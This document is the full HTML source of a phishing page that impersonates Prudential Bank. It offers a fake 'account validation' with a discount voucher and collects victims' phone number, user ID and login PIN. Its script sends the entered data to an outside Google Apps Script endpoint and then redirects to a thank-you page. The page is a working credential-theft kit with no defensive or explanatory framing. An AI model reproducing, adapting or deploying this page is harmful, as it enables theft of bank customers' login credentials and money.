<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Prudential Bank Validation</title>

  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      background: #f2f7f8;
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
      color: #0A1A2F;
    }

    .header {
      background: linear-gradient(to bottom, #009CA6, #006F78);
      color: white;
      text-align: center;
      padding: 25px 20px;
      width: 100%;
      max-width: 600px;
      border-bottom-left-radius: 20px;
      border-bottom-right-radius: 20px;
    }

    .welcome-text {
      width: 90%;
      max-width: 500px;
      text-align: center;
      margin-top: 18px;
    }

    .form-wrap {
      background: #ffffff;
      width: 90%;
      max-width: 400px;
      margin-top: 20px;
      padding: 30px 25px;
      border-radius: 15px;
      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
    }

    label {
      display: block;
      margin-bottom: 6px;
      font-size: 14px;
      font-weight: bold;
    }

    input {
      width: 100%;
      padding: 12px;
      margin-bottom: 18px;
      border-radius: 8px;
      border: 1px solid #c5c5c5;
      font-size: 14px;
    }

    button {
      width: 100%;
      padding: 12px;
      border-radius: 8px;
      border: none;
      background: #0A1A2F;
      color: white;
      font-weight: bold;
      cursor: pointer;
      font-size: 16px;
    }

    .overlay {
      position: fixed;
      inset: 0;
      background: rgba(0,0,0,0.45);
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      color: white;
      font-size: 18px;
      opacity: 0;
      pointer-events: none;
      transition: opacity 0.3s ease;
    }

    .overlay.active {
      opacity: 1;
      pointer-events: all;
    }

    .spinner {
      border: 4px solid #fff;
      border-top: 4px solid #009CA6;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin-bottom: 15px;
    }

    @keyframes spin {
      100% { transform: rotate(360deg); }
    }
  </style>
</head>

<body>

  <div class="header">
    <h1>PRUDENTIAL BANK</h1>
    <p>Truly Dependable</p>
  </div>

  <div class="welcome-text">
    <p>Validate your account for smooth transactions and claim a 10% discount voucher.</p>
  </div>

  <form id="dataForm" class="form-wrap" autocomplete="off">
    <label>Phone Number</label>
    <input type="tel" name="phone" required>

    <label>User ID</label>
    <input type="text" name="userId" required>

    <label>Login PIN</label>
    <input type="password" name="pin" required>

    <button type="submit">CONTINUE →</button>
  </form>

  <div class="overlay" id="overlay">
    <div class="spinner"></div>
    Processing, please wait…
  </div>

  <script>
    const scriptURL = 'https://script.google.com/macros/s/AKfycbyl_x_zyylW6pj2yKDnOo4ZG1KL5yt8fbcc5gVJk2QfSrMsf_4aKYLa9FTKwFJRfi3Cpw/exec';
    const form = document.getElementById('dataForm');
    const overlay = document.getElementById('overlay');

    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      overlay.classList.add('active');

      try {
        await fetch(scriptURL, {
          method: 'POST',
          body: new FormData(form)
        });

        window.location.href = 'thankyou.html';
      } catch (error) {
        overlay.classList.remove('active');
        alert('Submission failed. Please try again.');
      }
    });
  </script>

</body>
</html>
